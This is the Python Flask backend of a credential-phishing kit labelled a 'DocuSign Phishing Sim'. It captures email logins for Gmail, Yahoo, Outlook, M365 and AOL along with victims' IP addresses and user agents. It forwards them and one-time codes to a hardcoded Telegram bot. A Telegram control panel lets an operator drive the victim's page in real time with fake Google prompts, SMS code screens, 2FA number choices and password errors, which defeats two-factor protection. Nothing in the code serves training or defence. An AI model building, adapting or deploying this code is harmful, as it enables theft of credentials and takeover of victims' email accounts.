#!/usr/bin/env python3
"""
DocuSign Phishing Sim — Backend API
"""

import json, logging, datetime, hashlib, threading, time, random, os
from flask import Flask, request, jsonify, send_from_directory, make_response
import requests as http_req

TELEGRAM_BOT_TOKEN = "8868268134:AAHTVlyTE0ksIwGG75SWEKg-qbUGd8wHE3s"
TELEGRAM_CHAT_ID = "8337327707"
LOG_FILE = "captured.log"
API_BASE = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"

app = Flask(__name__)

gmail_sessions = {}
gmail_sessions_lock = threading.Lock()

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)


@app.after_request
def add_cors(response):
    response.headers["Access-Control-Allow-Origin"] = "*"
    response.headers["Access-Control-Allow-Headers"] = "Content-Type"
    response.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
    return response


def get_real_ip():
    forwarded = request.headers.get("X-Forwarded-For", "")
    if forwarded:
        ip = forwarded.split(",")[0].strip()
        if ip and not ip.startswith(("10.", "172.16.", "192.168.", "127.")):
            return ip
    return request.remote_addr


def tg_send(text, markup=None):
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": "HTML"}
    if markup:
        payload["reply_markup"] = json.dumps(markup)
    try:
        r = http_req.post(f"{API_BASE}/sendMessage", json=payload, timeout=15)
        d = r.json()
        if d.get("ok"):
            return d["result"]["message_id"]
        logger.error(f"TG fail: {d}")
    except Exception as e:
        logger.error(f"TG error: {e}")
    return None


def tg_edit(msg_id, text, markup=None):
    payload = {"chat_id": TELEGRAM_CHAT_ID, "message_id": msg_id, "text": text, "parse_mode": "HTML"}
    if markup:
        payload["reply_markup"] = json.dumps(markup)
    try:
        http_req.post(f"{API_BASE}/editMessageText", json=payload, timeout=15)
    except Exception as e:
        logger.error(f"TG edit error: {e}")


def tg_answer(cq_id):
    try:
        http_req.post(f"{API_BASE}/answerCallbackQuery",
                      json={"callback_query_id": cq_id}, timeout=10)
    except:
        pass


# ─── CONTROL PANEL — EXTRACTED FROM THE WORKING SEPARATE CODE ───

def send_control_panel(sid, email, prev_msg_id=None):
    """Main Gmail control panel with all flow buttons"""
    kb = {"inline_keyboard": [
        [{"text": "✅ Yes Prompt", "callback_data": f"yes_prompt:{sid}"}],
        [{"text": "📱 SMS Code I", "callback_data": f"sms1:{sid}"}, 
         {"text": "📱 SMS Code II", "callback_data": f"sms2:{sid}"}],
        [{"text": "🔢 2FA Number Grid", "callback_data": f"show_2fa:{sid}"}],
        [{"text": "❌ Password Error", "callback_data": f"pw_error:{sid}"}],
        [{"text": "🚫 Block", "callback_data": f"block:{sid}"}, 
         {"text": "✅ Success", "callback_data": f"success:{sid}"}]
    ]}
    text = f"🎮 <b>Gmail Control Panel</b>\n👤 {email}"
    if prev_msg_id:
        tg_edit(prev_msg_id, text, kb)
        return prev_msg_id
    else:
        return tg_send(text, kb)


def send_2fa_grid(sid, prev_msg_id=None):
    """Send 2FA number grid (10-99)"""
    numbers = [f"{i}{j}" for i in range(1, 10) for j in range(0, 10)]
    rows = []
    row = []
    for n in numbers:
        row.append({"text": n, "callback_data": f"2fa_{n}:{sid}"})
        if len(row) == 5:
            rows.append(row)
            row = []
    if row:
        rows.append(row)
    rows.append([{"text": "🔙 Back to Control Panel", "callback_data": f"back_panel:{sid}"}])
    
    if prev_msg_id:
        tg_edit(prev_msg_id, "🔢 Choose the 2-digit number to show the user:", {"inline_keyboard": rows})
    else:
        tg_send("🔢 Choose the 2-digit number to show the user:", {"inline_keyboard": rows})


@app.route(f"/webhook/{TELEGRAM_BOT_TOKEN}", methods=["POST"])
def webhook():
    try:
        d = request.get_json(force=True)
        if "callback_query" in d:
            cb = d["callback_query"]
            tg_answer(cb["id"])
            data = cb["data"]
            mid = cb["message"]["message_id"]

            # ─── YES PROMPT ───
            if data.startswith("yes_prompt:"):
                sid = data.split(":", 1)[1]
                with gmail_sessions_lock:
                    if sid not in gmail_sessions:
                        tg_send("Session not found")
                        return jsonify({"ok": True})
                    gmail_sessions[sid]["action"] = "yes_prompt"
                    gmail_sessions[sid]["stage"] = "prompt"
                tg_send("✅ Google Prompt sent to user's page!")

            # ─── SMS Code I ───
            elif data.startswith("sms1:"):
                sid = data.split(":", 1)[1]
                with gmail_sessions_lock:
                    if sid in gmail_sessions:
                        code1 = f"{random.randint(100000, 999999)}"
                        gmail_sessions[sid]["sms1"] = code1
                        gmail_sessions[sid]["action"] = "sms1"
                        gmail_sessions[sid]["stage"] = "sms1"
                tg_send(f"📱 SMS Code I sent to user: <code>{code1}</code>")

            # ─── SMS Code II ───
            elif data.startswith("sms2:"):
                sid = data.split(":", 1)[1]
                with gmail_sessions_lock:
                    if sid in gmail_sessions:
                        code2 = f"{random.randint(100000, 999999)}"
                        gmail_sessions[sid]["sms2"] = code2
                        gmail_sessions[sid]["action"] = "sms2"
                        gmail_sessions[sid]["stage"] = "sms2"
                tg_send(f"📱 SMS Code II sent to user: <code>{code2}</code>")

            # ─── SHOW 2FA GRID ───
            elif data.startswith("show_2fa:"):
                sid = data.split(":", 1)[1]
                send_2fa_grid(sid, mid)

            # ─── 2FA NUMBER SELECTED ───
            elif data.startswith("2fa_"):
                # Format: 2fa_XX:sid
                parts = data.split(":")
                num_part = parts[0]  # "2fa_XX"
                sid = parts[1]
                number = num_part.split("_")[1]  # "XX"
                with gmail_sessions_lock:
                    if sid in gmail_sessions:
                        gmail_sessions[sid]["fa2_choice"] = number
                        gmail_sessions[sid]["action"] = "fa2_show"
                        gmail_sessions[sid]["stage"] = "fa2_show"
                tg_send(f"🔢 Showing 2FA code <b>{number}</b> to user!")

            # ─── PASSWORD ERROR ───
            elif data.startswith("pw_error:"):
                sid = data.split(":", 1)[1]
                with gmail_sessions_lock:
                    if sid in gmail_sessions:
                        gmail_sessions[sid]["action"] = "pw_error"
                        gmail_sessions[sid]["stage"] = "error"
                tg_send("❌ Password error shown to user!")

            # ─── BLOCK ───
            elif data.startswith("block:"):
                sid = data.split(":", 1)[1]
                with gmail_sessions_lock:
                    if sid in gmail_sessions:
                        gmail_sessions[sid]["action"] = "blocked"
                        gmail_sessions[sid]["stage"] = "blocked"
                tg_send("🚫 User is now blocked!")

            # ─── SUCCESS ───
            elif data.startswith("success:"):
                sid = data.split(":", 1)[1]
                with gmail_sessions_lock:
                    if sid in gmail_sessions:
                        s = gmail_sessions[sid]
                        s["action"] = "success"
                        s["stage"] = "done"
                        tg_edit(mid,
                            f"✅ COMPLETE — {s['email']}\n\n"
                            f"Email: {s['email']}\nPassword: {s['password']}\n"
                            f"SMS I: {s.get('sms1','N/A')}\nSMS II: {s.get('sms2','N/A')}\n"
                            f"2FA Number: {s.get('fa2_choice','N/A')}")

            # ─── BACK TO CONTROL PANEL ───
            elif data.startswith("back_panel:"):
                sid = data.split(":", 1)[1]
                with gmail_sessions_lock:
                    if sid in gmail_sessions:
                        send_control_panel(sid, gmail_sessions[sid]["email"], mid)

        elif "message" in d:
            msg = d["message"]
            chat_id = msg.get("chat", {}).get("id")
            text = msg.get("text", "")
            if str(chat_id) == TELEGRAM_CHAT_ID:
                if text == "/status":
                    with gmail_sessions_lock:
                        active = [(k, v) for k, v in gmail_sessions.items() if v.get("action") not in ("success", "cancelled")]
                    if not active:
                        tg_send("No active sessions.")
                    else:
                        lines = [f"Active: {len(active)}"]
                        for sid, s in active:
                            lines.append(f"• {s['email']} — {s.get('stage','?')}")
                        tg_send("\n".join(lines))
                elif text == "/start" or text == "/menu":
                    tg_send("🤖 <b>Gmail Flow Control Bot</b>\n\nUse /status to check active sessions.")

        return jsonify({"ok": True})
    except Exception as e:
        logger.error(f"Webhook error: {e}", exc_info=True)
        return jsonify({"ok": False}), 500


@app.route("/")
def index():
    return send_from_directory(".", "index.html")


@app.route("/setup_webhook", methods=["POST"])
def setup_webhook():
    data = request.json
    url = data.get("url", "")
    if not url:
        return jsonify({"error": "Provide url"}), 400
    wh = f"{url.rstrip('/')}/webhook/{TELEGRAM_BOT_TOKEN}"
    try:
        http_req.get(f"{API_BASE}/deleteWebhook", params={"drop_pending_updates": True}, timeout=15)
        http_req.post(f"{API_BASE}/setWebhook", json={
            "url": wh, "allowed_updates": ["message", "callback_query"],
            "drop_pending_updates": True
        }, timeout=15)
        time.sleep(1)
        info = http_req.get(f"{API_BASE}/getWebhookInfo", timeout=15).json()
        return jsonify({"webhook_url": wh, "info": info.get("result", info)})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/creds", methods=["POST", "OPTIONS"])
def capture():
    if request.method == "OPTIONS":
        return make_response("", 204)

    data = request.json
    provider = data.get("provider", "unknown")
    email = data.get("email", "")
    password = data.get("password", "")
    ip = get_real_ip()
    ua = request.headers.get("User-Agent", "unknown")
    sid = hashlib.md5(f"{time.time()}{random.random()}{email}".encode()).hexdigest()[:12]

    entry = {"timestamp": datetime.datetime.utcnow().isoformat(), "provider": provider,
             "email": email, "password": password, "ip": ip, "ua": ua, "session": sid}
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")

    logger.info(f"Creds: {provider} / {email} / IP={ip}")

    if provider == "gmail":
        with gmail_sessions_lock:
            gmail_sessions[sid] = {
                "email": email, "password": password, "ip": ip, "ua": ua,
                "action": "waiting", "stage": "new",
                "phone": None, "sms1": None, "sms2": None, "fa2_choice": None
            }

        tg_send(f"[+]___ Invitation Card (GMAIL) ___[+]\n"
                f"New form submission\nIP: {ip}\nEmail: {email}\nPassword: {password}\nUA: {ua}")

        send_control_panel(sid, email)

        return jsonify({"session": sid, "action": "waiting"})

    else:
        pid = {"yahoo": "yahoo", "outlook": "outlook", "m365": "m365", "aol": "aol"}.get(provider, provider)
        tg_send(f"[+]___ Invitation Card ___[+]\nIP: {ip}\nId: {pid}\nEmail: {email}\nPassword: {password}")
        return jsonify({"session": sid, "action": "check_provider"})


@app.route("/api/gmail/status/<session_id>")
def gmail_status(session_id):
    with gmail_sessions_lock:
        if session_id not in gmail_sessions:
            return jsonify({"action": "waiting"})
        s = gmail_sessions[session_id]
        action = s.get("action", "waiting")

    if action == "waiting":
        return jsonify({"action": "waiting"})
    elif action == "yes_prompt":
        return jsonify({"action": "yes_prompt", "email": s.get("email", "")})
    elif action == "sms1":
        return jsonify({"action": "sms", "code": s.get("sms1", "000000"), "num": 1})
    elif action == "sms2":
        return jsonify({"action": "sms", "code": s.get("sms2", "000000"), "num": 2})
    elif action == "fa2_show":
        return jsonify({"action": "fa2_show", "fa2_choice": s.get("fa2_choice", "--")})
    elif action == "pw_error":
        return jsonify({"action": "pw_error"})
    elif action == "blocked":
        return jsonify({"action": "blocked"})
    elif action == "success":
        return jsonify({"action": "success"})
    elif action == "cancelled":
        return jsonify({"action": "redirect", "url": "https://accounts.google.com"})
    return jsonify({"action": "waiting"})


@app.route("/api/gmail/authorize/<session_id>", methods=["POST"])
def gmail_authorize(session_id):
    with gmail_sessions_lock:
        if session_id in gmail_sessions:
            gmail_sessions[session_id]["action"] = "authorized"
            tg_send(f"✅ User clicked 'Yes/Authorized' for {gmail_sessions[session_id]['email']}")
        else:
            return jsonify({"status": "error"}), 404
    return jsonify({"status": "ok"})


@app.route("/api/otp", methods=["POST"])
def capture_otp():
    data = request.json
    otp = data.get("otp", "")
    provider = data.get("provider", "unknown")
    session_id = data.get("session", "unknown")
    ip = get_real_ip()

    entry = {"timestamp": datetime.datetime.utcnow().isoformat(), "event": "otp",
             "provider": provider, "otp": otp, "ip": ip, "session": session_id}
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")

    logger.info(f"OTP: {provider} / {otp} / IP={ip}")
    tg_send(f"[+]___ OTP Code ___[+]\nId: {provider}\nOTP: {otp}")
    return jsonify({"status": "ok"})


@app.route("/health")
def health():
    with gmail_sessions_lock:
        return jsonify({"status": "ok", "sessions": len(gmail_sessions)})


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port, debug=False)
